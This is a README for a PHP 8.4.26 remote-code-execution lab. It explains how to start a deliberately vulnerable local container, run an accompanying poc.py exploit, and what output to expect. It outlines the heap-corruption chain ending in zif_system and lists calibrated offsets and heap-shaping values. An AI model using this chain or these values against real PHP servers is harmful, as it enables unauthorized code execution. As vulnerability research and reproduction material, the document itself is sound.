# PHP 8.4.26 php2shell RCE lab

Authorized local research only.

This repository contains a minimal vulnerable PHP target and a standalone
plain-HTTP exploit for the pre-patch PHP `session.upload_progress` issue.
The target page is only:

```php
<?php echo "OK\n"; ?>
```

It does not call `session_start()`, install an application plugin, or require
a deserialization gadget. The exploit leaks the Zend MM and `libphp` bases,
forges a session reference and reaches `zif_system`.

## Related CVEs

- **CVE-2026-109618** — RCE caused by request state corruption when an OOM
  bailout interrupts a partially initialized request.
- **CVE-2026-109619** — RCE caused by request-owned worker global state
  surviving after its backing memory has been freed.

This lab exercises the pre-RINIT OOM and cross-request stale-state behavior
against the affected PHP 8.4.26 build.

## Verified environment

```text
PHP       8.4.26 NTS mod_php
Apache    2.4.68 prefork, one worker
Platform  linux/amd64
Limits    display_errors=On, memory_limit=8M, post_max_size=64M
```

The PHP module comes from the official `php:8.4.26-apache` image. The Apache
layer is rebuilt from the official 2.4.68 source release.

The chain was reproduced on three independently recreated containers. The
proof is:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Requirements

- Docker Engine or Docker Desktop
- Bash and `curl` for `start-lab.sh`
- Python 3.10+
- An x86_64 Linux container runtime

The exploit is calibrated for `linux/amd64`. ARM hosts can run the supplied
target through Docker emulation, but the target itself remains x86_64.

## Start the lab

### macOS Intel

Install Docker Desktop, open a terminal in this repository, then run:

```bash
chmod +x start-lab.sh poc.py
./start-lab.sh
```

### macOS Apple Silicon

Enable **Use Rosetta for x86/amd64 emulation** in Docker Desktop if your
Docker version provides it. Otherwise use Docker's QEMU emulation. The
scripts already pass `--platform linux/amd64`.

```bash
chmod +x start-lab.sh poc.py
./start-lab.sh
```

### Linux x86_64

```bash
chmod +x start-lab.sh poc.py
./start-lab.sh
```

### Linux ARM64

Install the amd64 runtime once, then start the lab:

```bash
sudo docker run --privileged --rm tonistiigi/binfmt --install amd64
chmod +x start-lab.sh poc.py
./start-lab.sh
```

### Windows with WSL2

Use a WSL2 distribution and enable Docker Desktop's WSL integration. From the
repository directory inside WSL:

```bash
chmod +x start-lab.sh poc.py
./start-lab.sh
```

### Windows with PowerShell

Use Docker Desktop in Linux-container mode. The Bash script can be run from
WSL or Git Bash, but PowerShell users can start the same target directly:

```powershell
docker build --platform linux/amd64 -t php2shell-official:8.4.26-apache2.4.68 .
New-Item -ItemType Directory -Force out | Out-Null
docker rm -f php2shell-official-target 2>$null

docker run -d --name php2shell-official-target `
  --platform linux/amd64 `
  -p 127.0.0.1:8088:80 `
  -v "${PWD}\out:/out" `
  --entrypoint /bin/sh `
  php2shell-official:8.4.26-apache2.4.68 `
  -c "mkdir -p /out && chown -R www-data:www-data /out && exec /opt/httpd-2.4.68/bin/httpd -DFOREGROUND -f /etc/httpd-php2shell.conf"
```

The first run builds the pinned Apache 2.4.68 image. The default URL on every
platform is:

```text
http://127.0.0.1:8088/index.php
```

Change the port on Unix-like systems:

```bash
PORT=18088 ./start-lab.sh
```

For PowerShell, change `8088` in both the `docker run` and PoC commands.

Stop the Bash-managed target with:

```bash
./start-lab.sh stop
```

On PowerShell:

```powershell
docker rm -f php2shell-official-target
```

## Run the PoC

The target URL is always a command-line argument:

macOS, Linux, WSL, and Git Bash:

```bash
./poc.py http://127.0.0.1:8088/index.php
```

PowerShell:

```powershell
py -3 .\poc.py http://127.0.0.1:8088/index.php
```

Restart the lab before every clean run. The terminal path intentionally
crashes the worker after writing the proof:

```bash
./start-lab.sh
./poc.py http://127.0.0.1:8088/index.php
```

Expected output:

```text
[*] leak: request A
[*] leak: request B
[+] chunk=...
[+] dtor=...
[+] HTDATA=...
[+] zif_system=...
[*] fire: request A
[*] fire: request B
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The proof is written to `out/p1`.

Only a non-empty proof file is accepted as success. A worker crash, an empty
HTTP response, or `zend_mm_heap corrupted` is not accepted as RCE evidence.

## How it works

1. Request A leaves a dangling `PS(id)` string after a pre-RINIT OOM.
2. Request B forges its length and forces a large out-of-bounds read into
   `Set-Cookie`, exposing Zend MM chunk pointers.
3. A second view of the same primitive places real HashTables in the leaked
   window and exposes their `pDestructor` code pointer.
4. Fire request A leaves a dangling `PS(http_session_vars)` reference.
5. A live 31-byte multipart value reclaims that reference with a forged
   `IS_REFERENCE`.
6. Reference destruction reaches a fake HashTable whose `pDestructor` is
   `zif_system`, executing `id>/out/p1`.

The terminal call intentionally crashes the worker after writing the proof.

## Calibrated values

```text
heap leak forge filler count       841
heap leak arrays                  150
heap leak forged length           0x80000
fire A pads                       80 x (name length=7, value length=1)
fire A SID length                 100
fire B live-reference carriers    200
fire B live-reference length      31
fire B fill fields                80
fire B mask fields                8
HTDATA                            chunk + 0x7e0d8
zif_system                        leaked pDestructor - 0x1f97f0
```

## Scope and limitations

This is a build-specific PoC, not a universal exploit:

- PHP 8.4.27, 8.3.36, 8.2.35, and 8.5.12 contain the fix.
- A rebuilt or upgraded target may require different offsets and heap shapes.
- The current terminal is calibrated for the x86_64 libphp ABI.
- The chain requires mod_php, one prefork worker, and the lab's memory limits.
- PHP-FPM, multi-worker deployments, and ARM64 are outside the verified scope.
- `display_errors=On` is required by the current leak.
